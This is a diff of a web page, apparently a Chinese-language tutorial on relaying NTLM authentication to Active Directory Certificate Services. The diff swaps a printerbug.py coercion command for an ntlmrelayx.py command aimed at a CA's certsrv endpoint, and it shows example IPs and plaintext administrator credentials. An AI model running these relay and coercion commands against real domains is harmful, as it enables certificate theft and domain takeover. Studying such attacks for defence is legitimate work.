@@ -612,10 +612,10 @@ net use \\192.168.88.140\ipc$ /user:edu\administrator chen@2023</code></pre>
 <p>可以看到，在默认情况下，证书注册服务、证书注册策略 web 服务、网络设备注册服务通过授权 http 头支持协商身份验证，支持 kerberos 及 NTLM。所以攻击者可以在这里进行中继攻击。</p>
 <p>攻击机器开启本地监听并将证书颁发机构(CA)设置为目标，即目标DC 192.168.174.2</p>
 <pre><code>#格式：
-python printerbug.py domain/username:password@&lt;targetName or Address&gt; &lt;hostname to connect to&gt;
+python3 ntlmrelayx.py -t http://&lt;ca-server&gt;/certsrv/certfnsh.asp -smb2support --adcs 
 
-#示例:
-python3 printerbug.py hacke/testuser:&#39;test@123&#39;@dc.hacke.testlab 192.168.174.129</code></pre>
+#示例：
+python3 ntlmrelayx.py -t http://192.168.174.160/certsrv/certfnsh.asp -smb2support --adcs</code></pre>
 <p><img src="/images/319.png"></p>
 <p>利用Spooler打印机服务漏洞强制认证</p>
 <pre><code>#格式：
